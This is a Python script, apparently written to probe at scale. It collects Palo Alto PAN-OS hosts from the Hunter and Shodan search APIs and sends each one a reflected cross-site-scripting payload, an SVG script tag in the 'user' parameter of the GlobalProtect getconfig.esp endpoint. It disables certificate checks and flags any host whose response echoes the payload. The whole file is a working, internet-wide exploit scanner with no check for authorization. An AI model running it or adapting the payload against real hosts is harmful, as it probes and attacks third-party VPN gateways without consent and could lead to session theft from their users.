import requests
import base64
import shodan
import warnings
import time
from urllib3.exceptions import InsecureRequestWarning

warnings.filterwarnings("ignore", category=InsecureRequestWarning)

# CONFIG [ TO FIX , will use a .env]
HUNTER_API_KEY = "YOUR_API_KEY"
SHODAN_API_KEY = "YOUR_API_KEY"

HUNTER_QUERY = 'product.name="PAN-OS"'
ENCODED_HUNTER_QUERY = base64.urlsafe_b64encode(HUNTER_QUERY.encode("utf-8")).decode('ascii')
SHODAN_QUERY = 'os:"PAN-OS"'

PAGE_SIZE = 50
FIELDS = 'ip,port'
MAX_PAGES_PER_BATCH = 10

# Required by Hunter using 2024-08-01 to 2025-07-01 since the API doesnt allow to fetch data of more than 1 year. 
START_TIME = "2024-08-01"
END_TIME = "2025-07-01"

PAYLOAD_PATH = (
    "/ssl-vpn/getconfig.esp"
    "?client-type=1"
    "&protocol-version=p1"
    "&app-version=3.0.1-10"
    "&clientos=Linux"
    "&os-version=linux-64"
    "&hmac-algo=sha1%2Cmd5"
    "&enc-algo=aes-128-cbc%2Caes-256-cbc"
    "&authcookie=12cea70227d3aafbf25082fac1b6f51d"
    "&portal=us-vpn-gw-N"
    "&user=%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%3Cscript%3Eprompt%28%22Defhawk%22%29%3C%2Fscript%3E%3C%2Fsvg%3E"
    "&domain=(empty_domain)"
    "&computer=computer"
)

#Allows 500 ips to be fetched in 1 day. 
def fetch_hunter_ips(start_page):
    all_ips = set()
    for page in range(start_page, start_page + MAX_PAGES_PER_BATCH):
        url = (
            f"https://api.hunter.how/search?"
            f"api-key={HUNTER_API_KEY}&query={ENCODED_HUNTER_QUERY}"
            f"&start_time={START_TIME}&end_time={END_TIME}"
            f"&page={page}&page_size={PAGE_SIZE}"
        )
        try:
            r = requests.get(url, timeout=10)
            if r.status_code != 200:
                print(f"[Hunter] Page {page} failed with status {r.status_code}")
                break

            json_data = r.json()
            data = json_data.get('data')
            if not data:
                print(f"[Hunter] No data on page {page}")
                break

            results = data.get('list', [])
            if not results:
                break

            for item in results:
                ip = item.get('ip')
                port = item.get('port', 443)
                if ip:
                    all_ips.add(f"{ip}:{port}" if port != 443 else ip)

            print(f"[Hunter] Page {page}: {len(results)} results")
            if len(results) < PAGE_SIZE:
                break

        except Exception as e:
            print(f"[Hunter] Error: {e}")
            break
    return all_ips

# Working smoothly
def fetch_shodan_ips(start_page):
    all_ips = set()
    api = shodan.Shodan(SHODAN_API_KEY)
    for page in range(start_page, start_page + MAX_PAGES_PER_BATCH):
        try:
            results = api.search(SHODAN_QUERY, page=page)
            matches = results.get('matches', [])
            if not matches:
                break
            for service in matches:
                ip = service.get('ip_str')
                port = service.get('port', 443)
                if ip:
                    all_ips.add(f"{ip}:{port}" if port != 443 else ip)
            print(f"[Shodan] Page {page}: {len(matches)} results")
            if len(matches) < 100:
                break
            time.sleep(1.5)
        except Exception as e:
            print(f"[Shodan] Error: {e}")
            break
    return all_ips

def build_url(ip):
    if ':' in ip:
        host, port = ip.split(':')
        return f"https://{host}:{port}{PAYLOAD_PATH}"
    return f"https://{ip}{PAYLOAD_PATH}"

def scan_target(ip):
    url = build_url(ip)
    try:
        resp = requests.get(url, timeout=10, verify=False)
        code = resp.status_code
        reflected = "prompt(\"Defhawk\")" in resp.text or "prompt('Defhawk')" in resp.text
        return ip, code, reflected, url
    except Exception as e:
        return ip, "ERROR", False, url

# Main function
if __name__ == "__main__":
    hunter_page = 1
    shodan_page = 1
    batch = 1

    while True:
        print(f"\n========== BATCH {batch} ==========")
        print("[*] Fetching Hunter pages", hunter_page, "to", hunter_page + MAX_PAGES_PER_BATCH - 1)
        hunter_ips = fetch_hunter_ips(hunter_page)

        print("[*] Fetching Shodan pages", shodan_page, "to", shodan_page + MAX_PAGES_PER_BATCH - 1)
        shodan_ips = fetch_shodan_ips(shodan_page)

        all_ips = sorted(set(hunter_ips | shodan_ips))
        if not all_ips:
            print("[!] No more IPs found. Stopping.")
            break

        print(f"[+] Total IPs to scan in this batch: {len(all_ips)}\n")

        for i, ip in enumerate(all_ips, 1):
                ip, status, is_vuln, payload_url = scan_target(ip)
                if is_vuln:
                    print(f"[{i}/{len(all_ips)}] ✅ {ip} | Status: {status} | Reflected")
                    print(f"    └─ {payload_url}")
                time.sleep(1.5)    

        hunter_page += MAX_PAGES_PER_BATCH
        shodan_page += MAX_PAGES_PER_BATCH
        batch += 1
